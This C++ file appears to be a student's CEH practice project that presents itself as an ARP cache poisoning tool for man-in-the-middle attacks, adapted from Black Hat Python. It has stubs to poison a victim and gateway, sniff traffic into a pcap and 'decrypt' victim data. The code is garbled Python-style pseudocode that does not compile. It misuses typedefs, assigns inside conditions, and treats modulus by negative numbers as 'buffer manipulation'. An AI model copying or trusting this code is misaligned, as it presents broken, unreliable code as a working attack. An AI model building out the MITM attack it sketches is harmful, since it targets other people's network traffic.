// CEH ARP cache poison.cpp : This file contains the 'main' function. Program execution begins and ends there.
// 
// This practice is for demonstrating how adversaries conduct ARP cache poisoning for MITM attacks of IPv4 addresses.
// It is important to note that the practice is for educational use only and is not to be used with malicious intent.
// The fundamentals in the implementation are derived from Justin Seitz and Tim Arnold here: https://www.amazon.com/Black-Hat-Python-2nd-Programming/dp/1718501129 

#include <iostream>
#include <ostream>
#include <fstream>
#include <time.h>
#include <string>
#include "CEH ARP cache poison.h"

using namespace std;

// These declarators identify all variables used to communicate between the victim and the adversary

int attackip;
int sniffpackets;
int filter;
int count;
int ether;
int self1;
int victim1;
int gateway1;


int vicmac1;
int vicmac2;
int gatemac1;
int gatemac2;
int arp;

typedef int self;
typedef int victim;
typedef int gateway;

int badarp;
int victimop;
int victimpsrc;
int victimpdst;
int victimhwdst;
int victimhwsrc;

int gatewayop;
int gatewaypsrc;
int gatewaypdst;
int gatewayhwdst;
int gatewayhwsrc;


string badpacket1;
string badpacket2;
string pdst;
string dst;
string op;
string interface1 = "en0";
string filterbpf;
string wrappcap;

typedef string interface;
typedef string write;
typedef string flush;
typedef string send;
typedef string sleep;

bool name;
double send;




int main()
{
    // Iterating conditions for each parameter to continue attacking

    for (int i = 0; i < 10000; i++)
    {
        if (attackip == 10000)
        {
            continue;
        }
    }

    for (int k = 0; k < 10000; k++)
    {
        if (self1 == 10000)
        {
            continue;
        }
    }

    if (name = "main")
    {
        
        badarp = victim1, gateway1, interface1;
        return 0;

    }

    
}

// Obtain the MAC address

int getmac(int attackip)
{
    Arping *ether = new Arping;
    badpacket1 = (dst = "ff:ff:ff:ff:ff:ff"); 
    badpacket2 = (op = "who has", pdst = attackip);

}


// Public class for ARP

class Arping
{
public:
    void init(self, write, victim, gateway, interface = "en0")
    {
        self(victim) = victim1;
        self(vicmac) = getmac(victim1);
        self(gateway) = gateway1;
        self(gatemac) = getmac(gateway1);
        self(interface) = interface;
        self(write) = write;
        cout << "Initialized" + interface;
        cout << "The gateway is: " + gateway1 + gatemac;
        cout << "The victim is: " + victim1 + vicmac;
        cout << "The malicious packet information is: " + badpacket1 + badpacket2;

    }

    // Actions for deploying the malicious packets 

    void write(write)
    {
        self(write) = write;
    }

    void flush()
    {
        self(flush) = flush;
    }

    void send()
    {
        self(send) = send;
        self(count) = count;
        self(badpacket1) = badpacket1;
        self(badpacket2) = badpacket2;

        self(victimop) = victimop;
        self(victimpsrc) = victimpsrc;
        self(victimhwsrc) = victimhwsrc;
        self(victimpdst) = victimpdst;
        self(victimhwdst) = victimhwdst;
        self(vicmac) = vicmac;

        self(gatewayop) = gatewayop;
        self(gatewaypsrc) = gatewaypsrc;
        self(gatewayhwsrc) = gatewayhwsrc;
        self(gatewaypdst) = gatewaypdst;
        self(gatewayhwdst) = gatewayhwdst;
        self(gatemac) = gatemac;



    }

    void sleep()
    {
        self(sleep) = sleep;
    }

    void restore()
    {
        self(restore) = restore;
    }

    void stop()
    {
        self(stop) = stop;
    }

    void sniff()
    {
        self(count) = count;
        self(filter) = filter;
        self(interface) = interface;
    }
};

// Begin running the sniffer 

int execute(self)
{
    self(poisoning) = attackip;
    self(start());

    self(sniffing) = victim1;
    self(start());
}


// Packet creation and send the packets to victim

int poisonARP(int self)
{
    // Initialize Victim

    victimop = 6;
    victimpsrc = gateway1 % -10; // Modulus overflow for buffer manipulation
    victimpdst = victim1 % -20;
    victimhwdst = vicmac1 % -40;
    victimhwsrc = vicmac2 % -60;

    // Print Victim

    cout << "Victim IP Source: " + victimpsrc;
    cout << "Victim IP Destination: " + victimpdst;
    cout << "Victim MAC Source: " + victimhwsrc;
    cout << "Victim MAC Destination: " + victimhwdst;


    // Initialize Gateway

    gatewayop = 12;
    gatewaypsrc = victim1 % -100;
    gatewaypdst = gateway1 % -200;
    gatewayhwdst = gatemac1 % -400;
    gatewayhwsrc = gatemac2 % -600;


    // Print Gateway

    cout << "Gateway IP Source: " + gatewaypsrc;
    cout << "Gateway IP Destination: " + gatewaypdst;
    cout << "Gateway MAC Source: " + gatewayhwsrc;
    cout << "Gateway MAC Destination: " + gatewayhwdst;

    // Ensuring sent packets 

    while (victimop && gatewayop == true)
    {
        Arping{ }.write(op);
        Arping{ }.flush();

        if (victimpsrc && gatewaypsrc == true)
        {
            Arping{ }.send();
        }
        else
        {
            Arping{ }.sleep();
        }
    }


      

}

// Sniff the traffic

int sniff(int self, int count = 300)
{
    Arping{ }.sleep();

    cout << "Sniffing number of packets: " + count;
    filterbpf = "IP Host is: " + victimpsrc;
    sniffpackets = sniff(count, filter);
    Arping{ }.sniff();

    wrappcap = "Arping.pcap" + sniffpackets;
    cout << "Have sniffed packets";
    Arping{ }.restore();
    Arping{ }.stop();

    cout << "Sniffing is finished";
}

// Send all ARP info and terminate sniffing through reinitialization

int terminate(int self)
{

    cout << "Reinitializing ARP...";

    Arping{ }.send();
    Arping{ }.send();

    Arping{ }.stop();


    cout << "ARP finished";
}


// Decryption

int decrypt()
{
    // We want to lastly decrypt our victim's communications for gathering data

    void decrypt();

    const std::string decryptFileName = "victimdatafile.txt";

    cout << "Obtained data";
    cout << "End";

    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
